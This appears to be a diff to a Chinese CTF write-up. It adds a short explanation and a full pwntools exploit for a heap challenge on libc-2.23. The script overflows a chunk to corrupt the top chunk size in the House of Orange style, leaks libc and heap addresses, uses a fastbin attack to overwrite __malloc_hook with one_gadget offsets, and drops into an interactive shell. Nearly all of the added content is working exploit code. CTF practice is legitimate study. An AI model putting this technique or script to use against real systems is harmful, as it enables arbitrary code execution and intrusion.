@@ -69,3 +69,83 @@ p.interactive()
 从题目可以看出要使用House of orange来解决问题
 分析附件也可以发现只有一次free的机会，edit可以溢出修改，
 修改top chunk后即可得到一个unsorted bins
+然后申请一个小堆块即可泄漏libc基址和heap基址
+然后fastbin attack修改malloc_hook即可打ogg
+```python
+from pwn import *
+from wstube import websocket
+import sys
+
+context(arch='amd64', os='linux', log_level='debug')
+local = True if len(sys.argv) == 1 else False
+elf_path = './' + sys.argv[0][:-3]
+libc_path = './libc-2.23.so'
+if local:
+    p = process(elf_path)
+else:
+    ip, port = ':'.split(':')
+    p = remote(ip, port)
+    # p = websocket("")
+
+def debug():
+    if local:
+        gdb.attach(p, '''
+            b *$rebase(0xe64)
+            b *$rebase(0xde9)
+            b *$rebase(0xcd9)
+            b *$rebase(0xd83)
+            b *$rebase(0xbf5)
+        ''')
+
+def choice(idx):
+    p.recvuntil(b'your choice:')
+    p.sendline(str(idx).encode())
+
+def add(len,content):
+    choice(1)
+    p.recvuntil(b'length of the diary content:')
+    p.sendline(str(len).encode())
+    p.recvuntil(b'content:')
+    p.send(content)
+
+def show():
+    choice(2)
+
+def delete():
+    choice(3)
+
+def edit(len, content):
+    choice(4)
+    p.recvuntil(b'length of the diary content:')
+    p.sendline(str(len).encode())
+    p.recvuntil(b'content:')
+    p.send(content)
+
+libc = ELF(libc_path)
+name = b'/bin/sh\x00'
+p.sendlineafter(b'name.', name)
+add(0x78, b'a'*0x80) #0
+edit(0x80, b'a'*0x78 + p64(0xf81)) # off by null
+add(0xf90, b'a')
+add(0x20, b'a'*8)
+show()
+p.recvuntil(b'a'*8)
+malloc_hook = u64(p.recv(8).ljust(8, b'\x00')) - 0x678
+libc = malloc_hook - libc.symbols['__malloc_hook']
+heap_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x80
+log.success('libc: ' + hex(libc))
+log.success('malloc_hook: ' + hex(malloc_hook))
+log.success('heap: ' + hex(heap_base))
+
+ogg = [0x4527a, 0xf03a4, 0xf1247]
+add(0x60, p64(malloc_hook - 0x23))
+delete()
+edit(0x60, p64(malloc_hook - 0x23))
+add(0x60, b'\x00')
+debug()
+add(0x60, b'\x00' * 0x13 + p64(libc + ogg[1]))
+choice(1)
+p.sendlineafter(b'content:', b'a')
+
+p.interactive()
+```
